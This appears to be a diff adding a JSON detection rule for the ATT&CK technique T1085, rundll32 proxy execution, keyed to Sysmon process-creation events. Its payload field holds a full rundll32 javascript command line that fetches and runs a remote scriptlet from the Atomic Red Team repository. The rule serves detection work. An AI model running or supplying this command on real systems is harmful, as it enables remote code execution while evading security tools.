@@ -1,0 +1,19 @@
+{
+	"name": "T1085 - Rundll32",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.",
+	"rules": {
+		"rundll32_sct": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing remote script with rundll32.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\rundll32.exe",
+				"Description": "Windows host process (Rundll32)",
+				"CommandLine": "rundll32.exe  javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct\")\""
+			}
+		}
+	}
+}
